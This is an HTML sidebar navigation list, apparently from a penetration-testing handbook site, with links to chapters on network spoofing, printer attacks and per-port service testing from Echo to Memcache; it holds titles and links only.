
            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.1.1" data-path="../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">
            
                <a href="../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">
            
                    
                    Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.2" data-path="../../pentesting/pentesting-network/spoofing-ssdp-and-upnp-devices.html">
            
                <a href="../../pentesting/pentesting-network/spoofing-ssdp-and-upnp-devices.html">
            
                    
                    Spoofing SSDP and UPnP Devices with EvilSSDP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.3" data-path="../../pentesting/pentesting-network/wifi-attacks/">
            
                <a href="../../pentesting/pentesting-network/wifi-attacks/">
            
                    
                    Wifi Attacks
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.1.3.1" data-path="../../pentesting/pentesting-network/wifi-attacks/evil-twin-eap-tls.html">
            
                <a href="../../pentesting/pentesting-network/wifi-attacks/evil-twin-eap-tls.html">
            
                    
                    Evil Twin EAP-TLS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.1.4" data-path="../../pentesting/pentesting-network/pentesting-ipv6.html">
            
                <a href="../../pentesting/pentesting-network/pentesting-ipv6.html">
            
                    
                    Pentesting IPv6
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.5" data-path="../../pentesting/pentesting-network/nmap-summary-esp.html">
            
                <a href="../../pentesting/pentesting-network/nmap-summary-esp.html">
            
                    
                    Nmap Summary (ESP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.6" data-path="../../pentesting/pentesting-network/network-protocols-explained-esp.html">
            
                <a href="../../pentesting/pentesting-network/network-protocols-explained-esp.html">
            
                    
                    Network Protocols Explained (ESP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.7" data-path="../../pentesting/pentesting-network/ids-evasion.html">
            
                <a href="../../pentesting/pentesting-network/ids-evasion.html">
            
                    
                    IDS and IPS Evasion
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.8" data-path="../../pentesting/pentesting-network/dhcpv6.html">
            
                <a href="../../pentesting/pentesting-network/dhcpv6.html">
            
                    
                    DHCPv6
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../../pentesting/pentesting-jdwp-java-debug-wire-protocol.html">
            
                <a href="../../pentesting/pentesting-jdwp-java-debug-wire-protocol.html">
            
                    
                    Pentesting JDWP - Java Debug Wire Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3" data-path="../../pentesting/pentesting-printers/">
            
                <a href="../../pentesting/pentesting-printers/">
            
                    
                    Pentesting Printers
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.3.1" data-path="../../pentesting/pentesting-printers/accounting-bypass.html">
            
                <a href="../../pentesting/pentesting-printers/accounting-bypass.html">
            
                    
                    Accounting bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.2" data-path="../../pentesting/pentesting-printers/buffer-overflows.html">
            
                <a href="../../pentesting/pentesting-printers/buffer-overflows.html">
            
                    
                    Buffer Overflows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.3" data-path="../../pentesting/pentesting-printers/credentials-disclosure-brute-force.html">
            
                <a href="../../pentesting/pentesting-printers/credentials-disclosure-brute-force.html">
            
                    
                    Credentials Disclosure / Brute-Force
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.4" data-path="../../pentesting/pentesting-printers/cross-site-printing.html">
            
                <a href="../../pentesting/pentesting-printers/cross-site-printing.html">
            
                    
                    Cross-Site Printing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.5" data-path="../../pentesting/pentesting-printers/document-processing.html">
            
                <a href="../../pentesting/pentesting-printers/document-processing.html">
            
                    
                    Document Processing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.6" data-path="../../pentesting/pentesting-printers/factory-defaults.html">
            
                <a href="../../pentesting/pentesting-printers/factory-defaults.html">
            
                    
                    Factory Defaults
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.7" data-path="../../pentesting/pentesting-printers/file-system-access.html">
            
                <a href="../../pentesting/pentesting-printers/file-system-access.html">
            
                    
                    File system access
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.8" data-path="../../pentesting/pentesting-printers/firmware-updates.html">
            
                <a href="../../pentesting/pentesting-printers/firmware-updates.html">
            
                    
                    Firmware updates
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.9" data-path="../../pentesting/pentesting-printers/memory-access.html">
            
                <a href="../../pentesting/pentesting-printers/memory-access.html">
            
                    
                    Memory Access
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.10" data-path="../../pentesting/pentesting-printers/physical-damage.html">
            
                <a href="../../pentesting/pentesting-printers/physical-damage.html">
            
                    
                    Physical Damage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.11" data-path="../../pentesting/pentesting-printers/software-packages.html">
            
                <a href="../../pentesting/pentesting-printers/software-packages.html">
            
                    
                    Software packages
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.12" data-path="../../pentesting/pentesting-printers/transmission-channel.html">
            
                <a href="../../pentesting/pentesting-printers/transmission-channel.html">
            
                    
                    Transmission channel
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.13" data-path="../../pentesting/pentesting-printers/print-job-manipulation.html">
            
                <a href="../../pentesting/pentesting-printers/print-job-manipulation.html">
            
                    
                    Print job manipulation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.14" data-path="../../pentesting/pentesting-printers/print-job-retention.html">
            
                <a href="../../pentesting/pentesting-printers/print-job-retention.html">
            
                    
                    Print Job Retention
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3.15" data-path="../../pentesting/pentesting-printers/scanner-and-fax.html">
            
                <a href="../../pentesting/pentesting-printers/scanner-and-fax.html">
            
                    
                    Scanner and Fax
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.4" data-path="../../pentesting/7-tcp-udp-pentesting-echo.html">
            
                <a href="../../pentesting/7-tcp-udp-pentesting-echo.html">
            
                    
                    7/tcp/udp - Pentesting Echo
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5" data-path="../../pentesting/pentesting-ftp/">
            
                <a href="../../pentesting/pentesting-ftp/">
            
                    
                    21 - Pentesting FTP
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.5.1" data-path="../../pentesting/pentesting-ftp/ftp-bounce-attack.html">
            
                <a href="../../pentesting/pentesting-ftp/ftp-bounce-attack.html">
            
                    
                    FTP Bounce attack - Scan
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5.2" data-path="../../pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file.html">
            
                <a href="../../pentesting/pentesting-ftp/ftp-bounce-download-2oftp-file.html">
            
                    
                    FTP Bounce - Download 2ÂºFTP file
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.6" data-path="../../pentesting/pentesting-ssh.html">
            
                <a href="../../pentesting/pentesting-ssh.html">
            
                    
                    22 - Pentesting SSH/SFTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.7" data-path="../../pentesting/pentesting-telnet.html">
            
                <a href="../../pentesting/pentesting-telnet.html">
            
                    
                    23 - Pentesting Telnet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.8" data-path="../../pentesting/pentesting-smtp/">
            
                <a href="../../pentesting/pentesting-smtp/">
            
                    
                    25,465,587 - Pentesting SMTP/s
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.8.1" data-path="../../pentesting/pentesting-smtp/smtp-commands.html">
            
                <a href="../../pentesting/pentesting-smtp/smtp-commands.html">
            
                    
                    SMTP - Commands
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.9" data-path="../../pentesting/43-pentesting-whois.html">
            
                <a href="../../pentesting/43-pentesting-whois.html">
            
                    
                    43 - Pentesting WHOIS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.10" data-path="../../pentesting/pentesting-dns.html">
            
                <a href="../../pentesting/pentesting-dns.html">
            
                    
                    53 - Pentesting DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.11" data-path="../../pentesting/69-udp-tftp.html">
            
                <a href="../../pentesting/69-udp-tftp.html">
            
                    
                    69/UDP TFTP/Bittorrent-tracker
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.12" data-path="../../pentesting/pentesting-finger.html">
            
                <a href="../../pentesting/pentesting-finger.html">
            
                    
                    79 - Pentesting Finger
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13" data-path="../../pentesting/pentesting-web/">
            
                <a href="../../pentesting/pentesting-web/">
            
                    
                    80,443 - Pentesting Web Methodology
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.13.1" data-path="../../pentesting/pentesting-web/spring-actuators.html">
            
                <a href="../../pentesting/pentesting-web/spring-actuators.html">
            
                    
                    Spring Actuators
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.2" data-path="../../pentesting/pentesting-web/artifactory-hacking-guide.html">
            
                <a href="../../pentesting/pentesting-web/artifactory-hacking-guide.html">
            
                    
                    Artifactory Hacking guide
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.3" data-path="../../pentesting/pentesting-web/apache.html">
            
                <a href="../../pentesting/pentesting-web/apache.html">
            
                    
                    Apache
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.4" data-path="../../pentesting/pentesting-web/jsp.html">
            
                <a href="../../pentesting/pentesting-web/jsp.html">
            
                    
                    JSP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.5" data-path="../../pentesting/pentesting-web/api-pentesting.html">
            
                <a href="../../pentesting/pentesting-web/api-pentesting.html">
            
                    
                    API Pentesting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.6" data-path="../../pentesting/pentesting-web/buckets/">
            
                <a href="../../pentesting/pentesting-web/buckets/">
            
                    
                    Buckets
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.13.6.1" data-path="../../pentesting/pentesting-web/buckets/firebase-database.html">
            
                <a href="../../pentesting/pentesting-web/buckets/firebase-database.html">
            
                    
                    Firebase Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.6.2" data-path="../../pentesting/pentesting-web/buckets/aws-s3.html">
            
                <a href="../../pentesting/pentesting-web/buckets/aws-s3.html">
            
                    
                    AWS-S3
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.13.7" data-path="../../pentesting/pentesting-web/cgi.html">
            
                <a href="../../pentesting/pentesting-web/cgi.html">
            
                    
                    CGI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.8" data-path="../../pentesting/pentesting-web/drupal.html">
            
                <a href="../../pentesting/pentesting-web/drupal.html">
            
                    
                    Drupal
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.9" data-path="../../pentesting/pentesting-web/flask.html">
            
                <a href="../../pentesting/pentesting-web/flask.html">
            
                    
                    Flask
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.10" data-path="../../pentesting/pentesting-web/git.html">
            
                <a href="../../pentesting/pentesting-web/git.html">
            
                    
                    Git
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.11" data-path="../../pentesting/pentesting-web/graphql.html">
            
                <a href="../../pentesting/pentesting-web/graphql.html">
            
                    
                    GraphQL
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.12" data-path="../../pentesting/pentesting-web/h2-java-sql-database.html">
            
                <a href="../../pentesting/pentesting-web/h2-java-sql-database.html">
            
                    
                    H2 - Java SQL database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.13" data-path="../../pentesting/pentesting-web/iis-internet-information-services.html">
            
                <a href="../../pentesting/pentesting-web/iis-internet-information-services.html">
            
                    
                    IIS - Internet Information Services
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.14" data-path="../../pentesting/pentesting-web/jboss.html">
            
                <a href="../../pentesting/pentesting-web/jboss.html">
            
                    
                    JBOSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.15" data-path="../../pentesting/pentesting-web/jenkins.html">
            
                <a href="../../pentesting/pentesting-web/jenkins.html">
            
                    
                    Jenkins
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.16" data-path="../../pentesting/pentesting-web/jira.html">
            
                <a href="../../pentesting/pentesting-web/jira.html">
            
                    
                    JIRA
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.17" data-path="../../pentesting/pentesting-web/joomla.html">
            
                <a href="../../pentesting/pentesting-web/joomla.html">
            
                    
                    Joomla
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.18" data-path="../../pentesting/pentesting-web/nginx.html">
            
                <a href="../../pentesting/pentesting-web/nginx.html">
            
                    
                    Nginx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.19" data-path="../../pentesting/pentesting-web/php-tricks-esp/">
            
                <a href="../../pentesting/pentesting-web/php-tricks-esp/">
            
                    
                    PHP Tricks (SPA)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.13.19.1" data-path="../../pentesting/pentesting-web/php-tricks-esp/php-useful-functions.html">
            
                <a href="../../pentesting/pentesting-web/php-tricks-esp/php-useful-functions.html">
            
                    
                    PHP - Useful Functions (disabled bypass)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.13.20" data-path="../../pentesting/pentesting-web/python.html">
            
                <a href="../../pentesting/pentesting-web/python.html">
            
                    
                    Python
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.21" data-path="../../pentesting/pentesting-web/spel-spring-expression-language.html">
            
                <a href="../../pentesting/pentesting-web/spel-spring-expression-language.html">
            
                    
                    SpEL - Spring Expression Language
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.22" data-path="../../pentesting/pentesting-web/tomcat.html">
            
                <a href="../../pentesting/pentesting-web/tomcat.html">
            
                    
                    Tomcat
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.23" data-path="../../pentesting/pentesting-web/vmware-esx-vcenter....html">
            
                <a href="../../pentesting/pentesting-web/vmware-esx-vcenter....html">
            
                    
                    VMWare (ESX, VCenter...)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.24" data-path="../../pentesting/pentesting-web/put-method-webdav.html">
            
                <a href="../../pentesting/pentesting-web/put-method-webdav.html">
            
                    
                    WebDav
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.25" data-path="../../pentesting/pentesting-web/werkzeug.html">
            
                <a href="../../pentesting/pentesting-web/werkzeug.html">
            
                    
                    werkzeug
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.13.26" data-path="../../pentesting/pentesting-web/wordpress.html">
            
                <a href="../../pentesting/pentesting-web/wordpress.html">
            
                    
                    Wordpress
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.14" data-path="../../pentesting/pentesting-kerberos-88/">
            
                <a href="../../pentesting/pentesting-kerberos-88/">
            
                    
                    88tcp/udp - Pentesting Kerberos
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.14.1" data-path="../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.html">
            
                <a href="../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.html">
            
                    
                    Harvesting tickets from Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.14.2" data-path="../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html">
            
                <a href="../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html">
            
                    
                    Harvesting tickets from Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.15" data-path="../../pentesting/pentesting-pop.html">
            
                <a href="../../pentesting/pentesting-pop.html">
            
                    
                    110,995 - Pentesting POP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.16" data-path="../../pentesting/pentesting-rpcbind.html">
            
                <a href="../../pentesting/pentesting-rpcbind.html">
            
                    
                    111/TCP/UDP - Pentesting Portmapper
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.17" data-path="../../pentesting/113-pentesting-ident.html">
            
                <a href="../../pentesting/113-pentesting-ident.html">
            
                    
                    113 - Pentesting Ident
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.18" data-path="../../pentesting/pentesting-ntp.html">
            
                <a href="../../pentesting/pentesting-ntp.html">
            
                    
                    123/udp - Pentesting NTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.19" data-path="../../pentesting/135-pentesting-msrpc.html">
            
                <a href="../../pentesting/135-pentesting-msrpc.html">
            
                    
                    135, 593 - Pentesting MSRPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.20" data-path="../../pentesting/137-138-139-pentesting-netbios.html">
            
                <a href="../../pentesting/137-138-139-pentesting-netbios.html">
            
                    
                    137,138,139 - Pentesting NetBios
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.21" data-path="../../pentesting/pentesting-smb.html">
            
                <a href="../../pentesting/pentesting-smb.html">
            
                    
                    139,445 - Pentesting SMB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.22" data-path="../../pentesting/pentesting-imap.html">
            
                <a href="../../pentesting/pentesting-imap.html">
            
                    
                    143,993 - Pentesting IMAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.23" data-path="../../pentesting/pentesting-snmp.html">
            
                <a href="../../pentesting/pentesting-snmp.html">
            
                    
                    161,162,10161,10162/udp - Pentesting SNMP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.24" data-path="../../pentesting/pentesting-irc.html">
            
                <a href="../../pentesting/pentesting-irc.html">
            
                    
                    194,6667,6660-7000 - Pentesting IRC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.25" data-path="../../pentesting/pentesting-264-check-point-firewall-1.html">
            
                <a href="../../pentesting/pentesting-264-check-point-firewall-1.html">
            
                    
                    264 - Pentesting Check Point FireWall-1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.26" data-path="../../pentesting/pentesting-ldap.html">
            
                <a href="../../pentesting/pentesting-ldap.html">
            
                    
                    389, 636, 3268, 3269 - Pentesting LDAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.27" data-path="../../pentesting/ipsec-ike-vpn-pentesting.html">
            
                <a href="../../pentesting/ipsec-ike-vpn-pentesting.html">
            
                    
                    500/udp - Pentesting IPsec/IKE VPN
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.28" data-path="../../pentesting/pentesting-modbus.html">
            
                <a href="../../pentesting/pentesting-modbus.html">
            
                    
                    502 - Pentesting Modbus
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.29" data-path="../../pentesting/512-pentesting-rexec.html">
            
                <a href="../../pentesting/512-pentesting-rexec.html">
            
                    
                    512 - Pentesting Rexec
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.30" data-path="../../pentesting/pentesting-rlogin.html">
            
                <a href="../../pentesting/pentesting-rlogin.html">
            
                    
                    513 - Pentesting Rlogin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.31" data-path="../../pentesting/pentesting-rsh.html">
            
                <a href="../../pentesting/pentesting-rsh.html">
            
                    
                    514 - Pentesting Rsh
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.32" data-path="../../pentesting/515-pentesting-line-printer-daemon-lpd.html">
            
                <a href="../../pentesting/515-pentesting-line-printer-daemon-lpd.html">
            
                    
                    515 - Pentesting Line Printer Daemon (LPD)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.33" data-path="../../pentesting/584-pentesting-afp.html">
            
                <a href="../../pentesting/584-pentesting-afp.html">
            
                    
                    548 - Pentesting Apple Filing Protocol (AFP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.34" data-path="../../pentesting/554-8554-pentesting-rtsp.html">
            
                <a href="../../pentesting/554-8554-pentesting-rtsp.html">
            
                    
                    554,8554 - Pentesting RTSP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.35" data-path="../../pentesting/623-udp-ipmi.html">
            
                <a href="../../pentesting/623-udp-ipmi.html">
            
                    
                    623/UDP/TCP - IPMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.36" data-path="../../pentesting/pentesting-631-internet-printing-protocol-ipp.html">
            
                <a href="../../pentesting/pentesting-631-internet-printing-protocol-ipp.html">
            
                    
                    631 - Internet Printing Protocol(IPP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.37" data-path="../../pentesting/873-pentesting-rsync.html">
            
                <a href="../../pentesting/873-pentesting-rsync.html">
            
                    
                    873 - Pentesting Rsync
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.38" data-path="../../pentesting/1026-pentesting-rusersd.html">
            
                <a href="../../pentesting/1026-pentesting-rusersd.html">
            
                    
                    1026 - Pentesting Rusersd
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.39" data-path="../../pentesting/1099-pentesting-java-rmi.html">
            
                <a href="../../pentesting/1099-pentesting-java-rmi.html">
            
                    
                    1098/1099 - Pentesting Java RMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.40" data-path="../../pentesting/pentesting-mssql-microsoft-sql-server.html">
            
                <a href="../../pentesting/pentesting-mssql-microsoft-sql-server.html">
            
                    
                    1433 - Pentesting MSSQL - Microsoft SQL Server
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.41" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/">
            
                    
                    1521,1522-1529 - Pentesting Oracle TNS Listener
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.41.1" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation.html">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation.html">
            
                    
                    Oracle Pentesting requirements installation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.41.2" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/tns-poison.html">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/tns-poison.html">
            
                    
                    TNS Poison
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.41.3" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.html">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.html">
            
                    
                    Remote stealth pass brute force
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.41.4" data-path="../../pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-rce-and-more.html">
            
                <a href="../../pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-rce-and-more.html">
            
                    
                    Oracle RCE & more
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.42" data-path="../../pentesting/1723-pentesting-pptp.html">
            
                <a href="../../pentesting/1723-pentesting-pptp.html">
            
                    
                    1723 - Pentesting PPTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.43" data-path="../../pentesting/1883-pentesting-mqtt-mosquitto.html">
            
                <a href="../../pentesting/1883-pentesting-mqtt-mosquitto.html">
            
                    
                    1883 - Pentesting MQTT (Mosquitto)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.44" data-path="../../pentesting/nfs-service-pentesting.html">
            
                <a href="../../pentesting/nfs-service-pentesting.html">
            
                    
                    2049 - Pentesting NFS Service
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.45" data-path="../../pentesting/pentesting-compaq-hp-insight-manager.html">
            
                <a href="../../pentesting/pentesting-compaq-hp-insight-manager.html">
            
                    
                    2301,2381 - Pentesting Compaq/HP Insight Manager
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.46" data-path="../../pentesting/3260-pentesting-iscsi.html">
            
                <a href="../../pentesting/3260-pentesting-iscsi.html">
            
                    
                    3260 - Pentesting ISCSI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.47" data-path="../../pentesting/3299-pentesting-saprouter.html">
            
                <a href="../../pentesting/3299-pentesting-saprouter.html">
            
                    
                    3299 - Pentesting SAPRouter
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.48" data-path="../../pentesting/pentesting-mysql.html">
            
                <a href="../../pentesting/pentesting-mysql.html">
            
                    
                    3306 - Pentesting Mysql
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.49" data-path="../../pentesting/pentesting-rdp.html">
            
                <a href="../../pentesting/pentesting-rdp.html">
            
                    
                    3389 - Pentesting RDP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.50" data-path="../../pentesting/3632-pentesting-distcc.html">
            
                <a href="../../pentesting/3632-pentesting-distcc.html">
            
                    
                    3632 - Pentesting distcc
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.51" data-path="../../pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html">
            
                <a href="../../pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html">
            
                    
                    4369 - Pentesting Erlang Port Mapper Daemon (epmd)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.52" data-path="../../pentesting/5353-udp-multicast-dns-mdns.html">
            
                <a href="../../pentesting/5353-udp-multicast-dns-mdns.html">
            
                    
                    5353/UDP Multicast DNS (mDNS)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.53" data-path="../../pentesting/pentesting-postgresql.html">
            
                <a href="../../pentesting/pentesting-postgresql.html">
            
                    
                    5432,5433 - Pentesting Postgresql
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.54" data-path="../../pentesting/5671-5672-pentesting-amqp.html">
            
                <a href="../../pentesting/5671-5672-pentesting-amqp.html">
            
                    
                    5671,5672 - Pentesting AMQP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.55" data-path="../../pentesting/pentesting-vnc.html">
            
                <a href="../../pentesting/pentesting-vnc.html">
            
                    
                    5800,5801,5900,5901 - Pentesting VNC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.56" data-path="../../pentesting/5984-pentesting-couchdb.html">
            
                <a href="../../pentesting/5984-pentesting-couchdb.html">
            
                    
                    5984,6984 - Pentesting CouchDB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.57" data-path="../../pentesting/5985-5986-pentesting-winrm.html">
            
                <a href="../../pentesting/5985-5986-pentesting-winrm.html">
            
                    
                    5985,5986 - Pentesting WinRM
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.58" data-path="../../pentesting/6000-pentesting-x11.html">
            
                <a href="../../pentesting/6000-pentesting-x11.html">
            
                    
                    6000 - Pentesting X11
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.59" data-path="../../pentesting/6379-pentesting-redis.html">
            
                <a href="../../pentesting/6379-pentesting-redis.html">
            
                    
                    6379 - Pentesting Redis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.60" data-path="../../pentesting/8009-pentesting-apache-jserv-protocol-ajp.html">
            
                <a href="../../pentesting/8009-pentesting-apache-jserv-protocol-ajp.html">
            
                    
                    8009 - Pentesting Apache JServ Protocol (AJP)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.61" data-path="../../pentesting/cassandra.html">
            
                <a href="../../pentesting/cassandra.html">
            
                    
                    9042/9160 - Pentesting Cassandra
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.62" data-path="../../pentesting/9100-pjl.html">
            
                <a href="../../pentesting/9100-pjl.html">
            
                    
                    9100 - Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.63" data-path="../../pentesting/9200-pentesting-elasticsearch.html">
            
                <a href="../../pentesting/9200-pentesting-elasticsearch.html">
            
                    
                    9200 - Pentesting Elasticsearch
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.64" data-path="../../pentesting/10000-network-data-management-protocol-ndmp.html">
            
                <a href="../../pentesting/10000-network-data-management-protocol-ndmp.html">
            
                    
                    10000 - Pentesting Network Data Management Protocol (ndmp)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.65" data-path="../../pentesting/11211-memcache.html">
            
                <a href="../../pentesting/11211-memcache.html">
            
                    
                    11211 - Pentesting Memcache
            
                </a>
            

            
        </li>
    
